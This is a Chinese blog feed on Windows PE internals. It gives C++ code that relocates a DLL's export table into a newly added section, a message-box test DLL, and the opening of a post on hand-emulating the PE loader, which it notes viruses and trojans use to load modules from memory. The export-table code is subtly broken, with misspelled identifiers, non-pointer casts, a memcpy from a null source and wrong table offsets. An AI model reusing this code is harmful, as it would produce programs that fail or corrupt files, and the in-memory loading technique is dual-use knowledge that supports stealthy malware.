class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">DWORD <span class="title">FOA2RVA</span><span class="params">(DWORD dwFOA, LPVOID lpBuffer)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    IMAGE_DOS_HEADER pDos = (IMAGE_DOS_HEADER)lpBuffer;</span><br><span class="line">    IMAGE_NT_HEADERS pNt = (IMAGE_NT_HEADERS)(pDos-&gt;e_lfanew + (DWORD)pDos);</span><br><span class="line">    IMAGE_SECTION_HEADER pSec = <span class="built_in">IMAGE_FIRST_SECTION</span>(pNt);</span><br><span class="line">    <span class="keyword">if</span>(dwFOA &lt; pSec[<span class="number">0</span>].PointerToRawData)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> dwFOA;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">size_t</span> i=<span class="number">0</span>;i&lt;pNt-&gt;FileHeader.NumberOfSections;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(dwFOA &gt;= pSec[i].PointerToRawData &amp;&amp; dwFOA &lt; (pSec[i].PointerToRawData + pSec[i].SizeOfRawData))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">return</span> pSec[i].VirtualAddress + dwFOA - pSec[i].PointerToRawData;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> dwFOA;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="移动导出表具体步骤"><a href="#移动导出表具体步骤" class="headerlink" title="移动导出表具体步骤"></a>移动导出表具体步骤</h2><h3 id="1-将Dll文件读入内存"><a href="#1-将Dll文件读入内存" class="headerlink" title="1. 将Dll文件读入内存"></a>1. 将Dll文件读入内存</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">char</span>* szFilePath = <span class="string">&quot;xxx&quot;</span>;</span><br><span class="line">HANDLE hFile = <span class="built_in">CreateFileA</span>(</span><br><span class="line">    szFilePath,</span><br><span class="line">    GENERIC_READ,</span><br><span class="line">    FILE_SHARE_READ,</span><br><span class="line">    <span class="literal">NULL</span>,</span><br><span class="line">    OPEN_EXISTING,</span><br><span class="line">    FILE_ATTRIBUTE_ARCHIVE,</span><br><span class="line">    <span class="literal">NULL</span></span><br><span class="line">);</span><br><span class="line"><span class="keyword">if</span>(hFile == INVALID_HANDLE_VALUE)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;CreateFileA Failed\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">DWORD dwFileSize = <span class="built_in">GetFileSize</span>(hFile, <span class="literal">NULL</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;dwFileSize: %d\n&quot;</span>, dwFileSize);</span><br><span class="line">LPVOID lpData = <span class="keyword">new</span> BYTE[dwFileSize];</span><br><span class="line"><span class="keyword">if</span>(lpData == <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;申请内存失败\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">DWORD dwRead = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">if</span>(FALSE == <span class="built_in">ReadFile</span>(hFile, lpData, dwFileSize, &amp;dwRead, <span class="literal">NULL</span>))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;ReadFile Failed\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;lpData: %x\n&quot;</span>, *(<span class="type">short</span>*)lpData);</span><br></pre></td></tr></table></figure><h3 id="2-新增节表"><a href="#2-新增节表" class="headerlink" title="2. 新增节表"></a>2. 新增节表</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 解析PE文件</span></span><br><span class="line">IMAGE_DOS_HEADER pDos = (IMAGE_DOS_HEADER)lpData;</span><br><span class="line">IMAGE_NT_HEADERS pNt = (IMAGE_NT_HAEDERS)(pDos-&gt;e_lfanew + (DWORD)lpData);</span><br><span class="line">PIMAGE_SECTION_HEADER pSec = <span class="built_in">IMAGE_FIRST_SECTION</span>(pNt);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 新增节表</span></span><br><span class="line">PIMAGE_SECTION_HEADER pNewSec = pSec + pNt-&gt;FileHeader.NumberOfSections;</span><br><span class="line"><span class="keyword">if</span>(((DWORD)lpData + pNt-&gt;OptionalHeader.SizeOfHeaders - (DWORD)pNewSec) &lt; <span class="number">80</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;空间不足新增节表失败\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 设置新接节表</span></span><br><span class="line"><span class="built_in">strcpy</span>((<span class="type">char</span>*)(pNewSec-&gt;Name), <span class="string">&quot;.export&quot;</span>);</span><br><span class="line">pNewSec-&gt;Misc.VirtualSize = <span class="number">0x1000</span>;</span><br><span class="line">pNewSec-&gt;VirtualAddress = pNt-&gt;OptionalHeader.SizeOfImage;</span><br><span class="line">pNewSec-&gt;SizeOfRawData = <span class="number">0x1000</span>;</span><br><span class="line">PIMAGE_SECTION_HEADER pLastSec = pSec + (pNt-&gt;FileHeader.NumberOfSections - <span class="number">1</span>);</span><br><span class="line">pNewSec-&gt;PointerToRawData = pLastSec-&gt;PointerToRawData + pLastSec-&gt;SizeOfRawData;</span><br><span class="line">pNewSec-&gt;Characteristics = pSec[<span class="number">1</span>].Characteristics;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 设置全0节表</span></span><br><span class="line"><span class="built_in">memset</span>((LPVOID)(pNewSec + <span class="number">1</span>), <span class="number">0</span>, <span class="number">40</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 修正头部信息</span></span><br><span class="line">pNt-&gt;FileHeader.NumberOfSections += <span class="number">1</span>;</span><br><span class="line">pNt-&gt;OptionalHeader.SizeOfImage += <span class="number">0x1000</span>;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="3-复制导出表"><a href="#3-复制导出表" class="headerlink" title="3. 复制导出表"></a>3. 复制导出表</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 申请内存</span></span><br><span class="line">LPVOID lpSecMemory = <span class="keyword">new</span> BYTE[<span class="number">0x1000</span>];</span><br><span class="line"><span class="keyword">if</span>(lpSecMemory == <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;申请内存失败\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 解析导出表</span></span><br><span class="line">PIMAGE_DATA_DIRECTORY pDir = (PIMAGE_DATA_DIRECTORY)(pNt-&gt;OptionalHeader.DataDirectory + IMAGE_DIRECTORY_ENTRY_EXPORT);</span><br><span class="line">PIMAGE_EXPORT_DIRECTORY pExport = (PIMAGE_EXPORT_DIRECTORY)(<span class="built_in">RVA2FOA</span>(pDir-&gt;VirtualAddress, lpData) + (DWORD)lpData);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;NumberOfNames: %d\n&quot;</span>, pExport-&gt;NumberOfNames);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 复制函数地址表</span></span><br><span class="line"><span class="comment">// 长度 NumberOfFunctions * 4</span></span><br><span class="line">LPVOID lpCopyDest = lpSecMemory;</span><br><span class="line">LPDWORD lpNewFuncAddr = (LPDWORD)lpCopyDest;</span><br><span class="line">LPVOID lpFuncAddr = (LPVOID)(<span class="built_in">RVA2FOA</span>(pExport-&gt;AddressOfFunctions, lpData) + (DWORD)lpData);</span><br><span class="line"><span class="built_in">memcpy</span>(lpCopyDest, lpFuncAddr, pExport-&gt;NumberOfFunctions * <span class="number">4</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;lpSecMemory =&gt; AddressOfFunctions: %x\n&quot;</span>, *(<span class="type">int</span>*)lpSecMemory);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;pExport-&gt;AddressOfFuntions: %x\n&quot;</span>, *(<span class="type">int</span>*)(<span class="built_in">RVA2FOA</span>(pExport-&gt;AddressOfFunctions, lpData) + (DWORD)lpData));</span><br><span class="line"></span><br><span class="line"><span class="comment">// 复制函数序号表</span></span><br><span class="line"><span class="comment">// 长度 NumberOfNames * 2</span></span><br><span class="line">lpCopyDest = (LPVOID)((DWORD)lpSecMemory + pExport-&gt;AddressOfFunctions * <span class="number">4</span>);</span><br><span class="line">LPDWORD lpNewOrdAddr = (LPDWORD)lpCopyDest;</span><br><span class="line">LPVOID lpOrdAddr = (LPVOID)(<span class="built_in">RVA2FOA</span>(pExport-&gt;AddressOfNameOrdinals, lpData) + (DWORD)lpData);</span><br><span class="line"><span class="built_in">memcpy</span>(lpCopyDest, lpOrdAddr, pExport-&gt;NumberOfNames * <span class="number">2</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;lpSecMemory =&gt; AddressOfNameOrdinals: %x\n&quot;</span>, *(<span class="type">char</span>*)((DWORD)lpSecMemory + pExport-&gt;NumberOfFunctions * <span class="number">4</span>));</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;pExport-&gt;AddressOfNameOrdinals: %x\n&quot;</span>, *(<span class="type">char</span>*)(<span class="built_in">RVA2FOA</span>(pExport-&gt;AddressOfNameOrdinals, lpData) + (DWORD)lpData));</span><br><span class="line"></span><br><span class="line"><span class="comment">// 复制函数名称表</span></span><br><span class="line"><span class="comment">// 长度 NumberOfNames * 4</span></span><br><span class="line">lpCopyDest = (LPVOID)((DWORD)lpSecMemory + pExport-&gt;NumberOfNames * <span class="number">2</span>);</span><br><span class="line">LPDWORD lpNewNameAddr = (LPDWORD)lpCopyDest;</span><br><span class="line">LPDWORD lpNameAddr = (LPDWORD)(<span class="built_in">RVA2FOA</span>(pExport-&gt;AddressOfNames, lpData) + (DWORD)lpData);</span><br><span class="line"><span class="built_in">memcpy</span>(lpCopyDest, <span class="number">0</span>, pExport-&gt;NumberOfNames * <span class="number">4</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 复制函数名称并修复名称表</span></span><br><span class="line">lpCopyDest = (LPVOID)((DWORD)lpSecMemory + pExport-&gt;NumberOfNames * <span class="number">4</span>);</span><br><span class="line"><span class="keyword">for</span>(<span class="type">size_t</span> i=<span class="number">0</span>; i&lt;pExoprt-&gt;NumberOfNames; i++)</span><br><span class="line">&#123;</span><br><span class="line">    LPSTR lpFuncName = (LPSTR)(<span class="built_in">RVA2FOA</span>(lpNameAddr[i], lpData) + (DWORD)lpData);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;lpFuncName: %s\n&quot;</span>, lpFuncName);</span><br><span class="line">    DWORD dwFuncLen = <span class="built_in">strlen</span>(lpFuncName) + <span class="number">1</span>;</span><br><span class="line">    <span class="built_in">memcpy</span>(lpCopyDest, lpFuncName, dwFuncLen);</span><br><span class="line">    *(lpNewFuncAddr + i) = <span class="built_in">FOA2RVA</span>((dwFileSize + (DWORD)lpCopyDest - (DWORD)lpSecMemory), lpData);</span><br><span class="line">    lpCopyDest = (LPVOID)((DWORD)lpCopyDest + dwFuncLen);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;lpSecMemory =&gt; AddressOfNames: %s\n&quot;</span>, ((DWORD)lpSecMemory + pExport-&gt;NumberOfFunctions * <span class="number">4</span> + pExport-&gt;NumberOfNames * <span class="number">2</span> + pExport-&gt;NumberOfNames * <span class="number">4</span>));</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;pExport-&gt;AddressName: %s\n&quot;</span>, (<span class="built_in">RVA2FOA</span>(lpNewFuncAddr[<span class="number">0</span>], lpData) + (DWORD)lpData));</span><br><span class="line"></span><br><span class="line"><span class="comment">// 复制导出表</span></span><br><span class="line"><span class="built_in">memcpy</span>(lpCopyDest, pExport, pDir-&gt;Size);</span><br><span class="line">PIMAGE_EXPORT_DIRECTORY pNewExport = (PIMAGE_EXPORT_DIRECTORY)lpCopyDest;</span><br><span class="line">pNewExport-&gt;AddressOfFunctions = <span class="built_in">FOA2RVA</span>((dwFileSize + (DWORD)lpNewFuncAddr - (DWORD)lpSecMemory), lpData);</span><br><span class="line">pNewExoprt-&gt;AddressOfNameOrdinals = <span class="built_in">FOA2RVA</span>((dwFileSize + (DWORD)lpNewOrdAddr - (DWORD)lpSecMemory), lpData);</span><br><span class="line">pNewExport-&gt;AddressOfNames = <span class="built_in">FOA2RVA</span>((dwFileSize + (DWORD)lpNewNameAddr - (DWORD)lpSecMemory), lpData);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 修复数据目录</span></span><br><span class="line">pNt-&gt;OptionalHeader.DataDirectory[<span class="number">0</span>].VirtualAddress = <span class="built_in">FOA2RVA</span>((dwFileSize + (DWORD)pNewExport - (DWORD)lpSecMemory), lpData);</span><br></pre></td></tr></table></figure><h3 id="4-将数据写入文件"><a href="#4-将数据写入文件" class="headerlink" title="4. 将数据写入文件"></a>4. 将数据写入文件</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">FILE* newFile = <span class="built_in">fopen</span>(<span class="string">&quot;xxx&quot;</span>, <span class="string">&quot;a+b&quot;</span>);</span><br><span class="line"><span class="keyword">if</span>(!newFile)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;打开新文件失败\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">size_t</span> m = <span class="built_in">fwrite</span>(lpData, dwFileSize, <span class="number">1</span>, newFile);</span><br><span class="line"><span class="keyword">if</span>(!m)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;写出文件第一部分失败\n&quot;</span>);</span><br><span class="line">    <span class="built_in">fclose</span>(newFile);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 写出新节</span></span><br><span class="line"><span class="type">size_t</span> n = <span class="built_in">fwrite</span>(lpSecMemory, <span class="number">0x1000</span>, <span class="number">1</span> , newFile);</span><br><span class="line"><span class="keyword">if</span>(!n)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;写出文件第二部分失败\n&quot;</span>);</span><br><span class="line">    <span class="built_in">fclose</span>(newFile);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 关闭文件并返回</span></span><br><span class="line"><span class="built_in">fclose</span>(newFile);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;移动导出表成功\n&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br></pre></td></tr></table></figure><h3 id="5-调用新导出表"><a href="#5-调用新导出表" class="headerlink" title="5. 调用新导出表"></a>5. 调用新导出表</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">void</span> <span class="params">(*MyShowMessage)</span><span class="params">()</span></span>;</span><br><span class="line">HMODULE hDll = <span class="built_in">LoadLibraryA</span>(<span class="string">&quot;xxx&quot;</span>);</span><br><span class="line"><span class="keyword">if</span>(hDll == <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;LoadLibrary Failed\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">MyShowMessage myShowMessage = (MyShowMessage)<span class="built_in">GetProcAddress</span>(hDll, <span class="string">&quot;ShowMessage&quot;</span>);</span><br><span class="line"><span class="built_in">myShowMessage</span>();</span><br><span class="line"><span class="built_in">FreeLibrary</span>(hDll);</span><br></pre></td></tr></table></figure><h2 id="运行成功"><a href="#运行成功" class="headerlink" title="运行成功"></a>运行成功</h2><p><img src="https://raw.githubusercontent.com/Dooookey/Photos/main/%E7%A7%BB%E5%8A%A8%E5%AF%BC%E5%87%BA%E8%A1%A8.png" class="lazyload" data-srcset="https://raw.githubusercontent.com/Dooookey/Photos/main/%E7%A7%BB%E5%8A%A8%E5%AF%BC%E5%87%BA%E8%A1%A8.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="移动导出表"></p><h2 id="dllmain-cpp"><a href="#dllmain-cpp" class="headerlink" title="dllmain.cpp"></a>dllmain.cpp</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// dllmain.cpp : 定义 DLL 应用程序的入口点。</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;pch.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">extern</span> <span class="string">&quot;C&quot;</span> __declspec(dllexport) <span class="function"><span class="type">void</span> <span class="title">ShowMessage</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">MessageBox</span>(<span class="literal">NULL</span>, <span class="string">L&quot;I`m DLL File&quot;</span>, <span class="string">L&quot;HELLO&quot;</span>, MB_OK);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">BOOL APIENTRY <span class="title">DllMain</span><span class="params">( HMODULE hModule,</span></span></span><br><span class="line"><span class="params"><span class="function">                       DWORD  ul_reason_for_call,</span></span></span><br><span class="line"><span class="params"><span class="function">                       LPVOID lpReserved</span></span></span><br><span class="line"><span class="params"><span class="function">                     )</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">switch</span> (ul_reason_for_call)</span><br><span class="line">    &#123;</span><br><span class="line">    <span class="keyword">case</span> DLL_PROCESS_ATTACH:</span><br><span class="line">    <span class="keyword">case</span> DLL_THREAD_ATTACH:</span><br><span class="line">    <span class="keyword">case</span> DLL_THREAD_DETACH:</span><br><span class="line">    <span class="keyword">case</span> DLL_PROCESS_DETACH:</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Windows PE </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Windows PE </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>手工模拟PE加载器</title>
      <link href="/dbdbea24.html"/>
      <url>/dbdbea24.html</url>
      
        <content type="html"><![CDATA[<div class="note info"><p><strong>内存直接加载运行</strong></p><ul><li>病毒木马具有模拟PE加载器的功能, 它们可以把DLL或者exe等PE文件从内存中直接加载到病毒木马的内存中去执行, 不需要通过LoadLibrary等现成的API函数去操作;</li><li>假如程序需要动态调用DLL文件, 内存加载运行技术可以把DLL作为资源插入到自己的程序中, 此时可直接在内存中加载运行即可;</li><li>内存加载技术的核心就在于模拟PE加载器PE文件, 也就是对导入表、导出表、重定位表的操作过程;</li></ul></div><span id="more"></span><h2 id="实现原理"><a href="#实现原理" class="headerlink" title="实现原理"></a>实现原理</h2><p>首先, 需要将DLL文件加载到内存中, 按照映像大小进行对齐后映射到内存中, 然后根据重定位表修改硬编码数据, 最后根据导出表函数地址修正导入表;</p><h3 id="流程总结"><a href="#流程总结" class="headerlink" title="流程总结"></a>流程总结</h3><div class="note guide"><p><strong></strong></p><ol><li>根据映像大小SizeOfImage申请可读可写可执行的内存空间, 首地址即DLL加载基址;</li><li>获取其映像对齐大小<code>SectionAlignment</code>并复制到该内存空间中（FileBuffer &#x3D;&gt; ImageBuffer）;</li><li>修正重定位表;</li><li>修正导入表, 根据PE结构中的导入表, 加载所需的Dll, 并获取导入函数的地址将其写入导入表中;</li><li>修改DLL的加载基址ImageBase;</li><li>获取DLL入口地址, 构造DllMain函数实现加载;</li></ol></div><p>对于exe文件, 重定位表不是必须的。因为对于exe进程来说, 进程最早加载的模块是exe模块, 所以它可以按照默认加载基址加载到内存中; exe和Dll唯一的区别在于构造入口函数的差别, exe不需要构造入口函数, 而是根据PE结构获取exe的入口地址偏移AddressOfEntryPoint并计算出入口地址, 然后直接跳转。</p><h3 id="1-将Dll文件读入内存"><a href="#1-将Dll文件读入内存" class="headerlink" title="1. 将Dll文件读入内存"></a>1. 将Dll文件读入内存</h3><figure class="highlight c++"><figcaption><span>PELodader_Demo.cpp</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">wchat_t</span> szFileName[MAX_PATH] =  <span class="string">L&quot;C:\\Users\\dell\\OneDrive\\桌面\\哔哩哔哩学习\\PE Learn\\PELoader_Demo\\Debug\\TestDLL_01.dll&quot;</span>;</span><br><span class="line">HANDLE hFile = <span class="built_in">CreateFile</span>(</span><br><span class="line">    szFileName,</span><br><span class="line">    GENERIC_READ | GENERIC_WRITE,</span><br><span class="line">    FILE_SHARE_READ | FILE_SHARE_WRITE,</span><br><span class="line">    <span class="literal">NULL</span>,</span><br><span class="line">    OPEN_EXISTING,</span><br><span class="line">    FILE_ATTRIBUTE_ARCHIVE,</span><br><span class="line">    <span class="literal">NULL</span></span><br><span class="line">);</span><br><span class="line"><span class="keyword">if</span> (hFile == INVALID_HANDLE_VALUE)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;CreateFile Failed\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line">DWORD dwFileSize = <span class="built_in">GetFileSize</span>(hFile, <span class="literal">NULL</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;GetFileSize: %d\n&quot;</span>, dwFileSize);</span><br><span class="line"><span class="comment">// 申请动态内存</span></span><br><span class="line">PBYTE lpData = <span class="keyword">new</span> BYTE[dwFileSize];</span><br><span class="line"><span class="keyword">if</span> (<span class="literal">NULL</span> == lpData)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;申请内存出错\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 将文件读取到内存中</span></span><br><span class="line">DWORD dwRead = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">if</span> (FALSE == <span class="built_in">ReadFile</span>(hFile, lpData, dwFileSize, &amp;dwRead, <span class="literal">NULL</span>))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;ReadFile Failed\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;lpData: %08x\n&quot;</span>, *(<span class="type">short</span>*)lpData); <span class="comment">// 5A4D</span></span><br></pre></td></tr></table></figure><span class='p medium'>CreateFile</span><blockquote><p>创建或打开文件或I&#x2F;O设备, 此函数区分多字节和Unicode两种模式</p></blockquote><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// UNICODE</span></span><br><span class="line"><span class="function">HANDLE</span></span><br><span class="line"><span class="function">WINAPI</span></span><br><span class="line"><span class="function"><span class="title">CreateFileW</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">    _In_ LPCWSTR lpFileName,        <span class="comment">// 要创建或打开的文件或设备名称</span></span></span></span><br><span class="line"><span class="params"><span class="function">    _In_ DWORD dwDesiredAccess,     <span class="comment">// 请求对文件或设备的访问权限, 常用值GENERIC_READ、GENERIC_WRITE</span></span></span></span><br><span class="line"><span class="params"><span class="function">    